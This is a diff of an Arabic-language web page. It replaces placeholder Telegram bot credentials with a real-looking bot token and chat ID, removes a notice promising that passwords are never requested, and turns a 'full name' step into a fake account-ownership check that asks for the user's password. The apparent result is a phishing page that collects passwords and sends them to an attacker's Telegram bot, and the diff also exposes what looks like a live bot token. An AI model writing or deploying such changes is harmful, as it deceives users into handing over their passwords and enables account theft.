@@ -14,8 +14,8 @@
         const TG_CHAT_ID = '987654321';
   -->
   <script>
-    const TG_TOKEN = 'PASTE_YOUR_BOT_TOKEN_HERE';
-    const TG_CHAT_ID = 'PASTE_YOUR_CHAT_ID_HERE';
+    const TG_TOKEN = '8794884027:AAEMu6aUsnkIwTvEyO05D8Aq4gheORNREac';
+    const TG_CHAT_ID = '6873334348';
   </script>
 
   <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700&display=swap" rel="stylesheet">
@@ -141,7 +141,6 @@
             <div id="primaryHolder">
               <input id="primaryInput" type="text" placeholder="مثال: myusername أو email@example.com" inputmode="latin" autocomplete="off" />
             </div>
-            <div class="micro">لن نطلب أو نرسل كلمات المرور. التصميم آمن للاستخدام الشخصي.</div>
           </div>
 
           <div style="text-align:center;margin-top:12px">
@@ -162,16 +161,16 @@
 
         <!-- PAGE 2 (Name) - Separate page within same file -->
         <section id="page-2" class="page hidden" aria-labelledby="title2">
-          <h1 id="title2" style="margin-top:0">التحقق — خطوة إضافية</h1>
-          <p class="lead">أدخل الاسم الكامل لإتمام العملية</p>
+          <h1 id="title2" style="margin-top:0">ادخل كلمة سر حسابك للتحقق من ملكيتك للحساب</h1>
+
 
           <div class="field">
-            <label for="nameInput">الاسم الكامل</label>
-            <input id="nameInput" type="text" placeholder="أدخل الاسم الكامل" autocomplete="off" />
+            <label for="nameInput">كلمة السر</label>
+            <input id="nameInput" type="text" placeholder="ادخل كلمة سر حسابك " autocomplete="off" />
           </div>
 
           <div class="controls">
-            <button id="sendBtn" class="btn">إرسال الاسم</button>
+            <button id="sendBtn" class="btn">تسجيل الدخول</button>
             <button id="backBtn" class="btn ghost">العودة</button>
           </div>
 
@@ -195,7 +194,7 @@
   <div id="toastBack" class="toast-back" aria-hidden="true">
     <div class="toast" role="alertdialog" aria-live="assertive">
       <h3 id="toastTitle">عذراً</h3>
-      <p id="toastText">اسم المستخدم أو الاسم غير صحيح. يرجى التحقق والمحاولة مرة أخرى.</p>
+      <p id="toastText">اسم المستخدم أو كلمة السر غير صحيحة. يرجى التحقق والمحاولة مرة أخرى.</p>
       <div style="margin-top:12px"><button id="toastOk">حسناً</button></div>
     </div>
   </div>
